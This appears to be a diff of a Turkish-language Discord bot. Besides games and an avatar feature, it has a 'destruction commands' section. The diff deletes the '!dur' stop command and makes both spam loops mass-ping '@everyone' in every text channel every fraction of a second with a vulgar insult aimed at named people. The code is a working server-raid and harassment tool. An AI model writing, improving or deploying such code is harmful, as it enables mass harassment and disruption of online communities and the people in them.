@@ -10,7 +10,6 @@ from PIL import Image, ImageDraw, ImageFont
 from flask import Flask
 from threading import Thread
 
-# --- Flask Web Sunucusu ---
 app = Flask(__name__)
 
 @app.route('/')
@@ -20,15 +19,12 @@ def home():
 def run_web():
     app.run(host='0.0.0.0', port=8080)
 
-# --- Discord Bot Ayarları ---
 intents = discord.Intents.all()
 bot = commands.Bot(command_prefix='!', intents=intents, help_command=None)
 
-# --- Global Değişkenler ---
 spam_aktif = False
 silme_aktif = False
 
-# --- Bot Olayları ---
 @bot.event
 async def on_ready():
     await bot.change_presence(activity=discord.Game(name="!yardım"))
@@ -44,7 +40,6 @@ async def on_command_error(ctx, error):
         print(f"Hata: {error}")
         await ctx.send(f"❌ Hata: {str(error)[:100]}")
 
-# --- Yardımcı Fonksiyon: Adam Asmaca ASCII Art ---
 def adam_ascii(can):
     ascii_art = [
         """
@@ -113,7 +108,6 @@ def adam_ascii(can):
     ]
     return ascii_art[6 - can] if 0 <= can <= 6 else ascii_art[0]
 
-# --- Yardımcı Fonksiyon: Ship için avatar birleştir ---
 async def birlestir_avatar(ctx, kisi1, kisi2, yuzde):
     async with aiohttp.ClientSession() as session:
         async with session.get(kisi1.avatar.url) as resp1:
@@ -153,7 +147,7 @@ async def birlestir_avatar(ctx, kisi1, kisi2, yuzde):
     return output
 
 # ========================
-# YIKIM KOMUTLARI (Admin)
+# YIKIM KOMUTLARI
 # ========================
 
 @bot.command()
@@ -208,31 +202,16 @@ async def spam(ctx):
     if spam_aktif:
         await ctx.send("⚠️ Zaten spam aktif.")
         return
-    
     spam_aktif = True
-    await ctx.send("💣 Hızlı spam başladı! (!dur ile durdur)")
-    
+    await ctx.send("🔊 Hızlı spam başladı! (!dur ile durdur)")
     while spam_aktif:
         tasks = []
         for kanal in ctx.guild.text_channels:
-            # ÖNEMLİ KISIM BURASI:
-            # allow_mentions=True diyerek @everyone'un ping olarak gitmesini sağlıyoruz
-            tasks.append(kanal.send(
-                "Valdo/Klowinc Siker .d @everyone", 
-                allowed_mentions=discord.AllowedMentions(everyone=True)
-            ))
-        
+            tasks.append(kanal.send("@everyone Valdo/Klowinc Siker .d"))
         await asyncio.gather(*tasks, return_exceptions=True)
         await asyncio.sleep(0.7)
-    
     await ctx.send("✅ Spam durduruldu.")
 
-@bot.command()
-@commands.has_permissions(administrator=True)
-async def dur(ctx):
-    global spam_aktif
-    spam_aktif = False
-    await ctx.send("⏹️ Spam durduruluyor...")
 @bot.command()
 @commands.has_permissions(administrator=True)
 async def spamyavas(ctx):
@@ -247,7 +226,7 @@ async def spamyavas(ctx):
             if not spam_aktif:
                 break
             try:
-                await kanal.send("Valdo/Klowinc Siker .d")
+                await kanal.send("@everyone Valdo/Klowinc Siker .d")
             except:
                 pass
         await asyncio.sleep(0.5)
